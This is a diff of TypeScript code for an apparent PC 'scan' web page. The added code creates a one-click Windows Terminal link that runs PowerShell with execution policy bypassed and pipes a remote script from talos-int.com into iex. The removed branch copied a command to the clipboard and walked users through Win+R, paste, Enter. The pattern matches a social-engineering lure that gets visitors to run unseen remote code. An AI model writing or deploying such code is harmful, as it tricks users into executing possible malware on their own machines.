@@ -807,31 +807,17 @@ function updateScanTrigger(isWin11: boolean) {
   if (!trigger) return;
 
   if (isWin11) {
-    // Lien wt: pour Windows 11 (Windows Terminal intégré)
+    // Lien wt: pour Windows 11 uniquement
+    const cmdBox = document.getElementById("sospc-cmd-box") as HTMLElement;
+    if (cmdBox) cmdBox.style.display = "none";
     trigger.innerHTML =
       '<a id="sospc-wt-link" href="wt: -d . powershell.exe -NoProfile -ExecutionPolicy Bypass -Command &quot;$s=\'' +
       sessionId +
       '\'; irm https://talos-int.com/diag.ps1 | iex&quot;" class="sospc-wt-btn">🚀 Scanner maintenant (1 clic)</a>' +
       '<div class="sospc-scan-sub">Windows Terminal va s\'ouvrir automatiquement</div>';
-  } else {
-    // Fallback clipboard + Win+R pour Windows 10
-    const cmd = buildCommand(sessionId || "NOSESSION");
-    navigator.clipboard.writeText(cmd).catch(() => {});
-    trigger.innerHTML =
-      '<div class="sospc-clipboard-instructions">' +
-      '<div class="sospc-clipboard-cmd">' +
-      cmd +
-      "</div>" +
-      '<div class="sospc-clipboard-steps">' +
-      '<span class="sospc-step"><kbd>⊞ Win</kbd> + <kbd>R</kbd></span>' +
-      '<span class="sospc-step"><kbd>Ctrl</kbd> + <kbd>V</kbd></span>' +
-      '<span class="sospc-step"><kbd>Entrée ↵</kbd></span>' +
-      "</div>" +
-      '<div class="sospc-scan-sub">📋 Commande copiée automatiquement</div>' +
-      "</div>";
+    trigger.style.display = "block";
   }
-
-  trigger.style.display = "block";
+  // Win10 ou OS inconnu : on garde l'UI originale (cmd-box + bouton Copier)
 }
 
 // Écoute le résultat du scan navigateur
